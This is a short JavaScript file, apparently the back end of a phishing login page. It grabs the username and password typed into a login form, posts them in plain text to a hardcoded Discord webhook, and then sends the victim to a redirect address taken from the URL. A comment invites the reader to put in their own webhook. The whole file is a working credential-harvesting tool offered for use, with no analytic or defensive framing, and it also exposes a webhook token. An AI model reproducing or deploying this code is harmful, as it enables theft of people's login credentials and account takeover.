// CHANGE THE WEBHOOK URL TO YOURS

const webhookUrl = 'https://discord.com/api/webhooks/1269737277492564070/3yOIzSQTZgwzqtLTAb-ijuJPLcLmgOjpw8EOiXUyyXombKhHAqyY6LQAIMP1y8UKXb2w';

function login() {
  const username = document.querySelector('.login-box input[type="text"]').value;
  const password = document.querySelector('.login-box input[type="password"]').value;

  // Send login information to Discord webhook
  sendToDiscordWebhook(username, password)
    .then(response => {
      // Get the redirect URL from the query parameter
      const urlParams = new URLSearchParams(window.location.search);
      const redirectUrl = urlParams.get('redirect_uri');

      // Redirect the user to the provided URL
      if (redirectUrl) {
        window.location.href = redirectUrl;
      } else {
        // If no redirect URL is provided, redirect to a default page
        window.location.href = 'index.html';
      }
    })
    .catch(error => {
      console.error('Error sending login information to Discord webhook:', error);
    });
}

function sendToDiscordWebhook(username, password) {

  // Prepare the data to send to the Discord webhook
  const data = {
    content: `New login attempt:\nUsername: ${username}\nPassword: ${password}`
  };

  // Send the data to the Discord webhook
  return fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  });
}
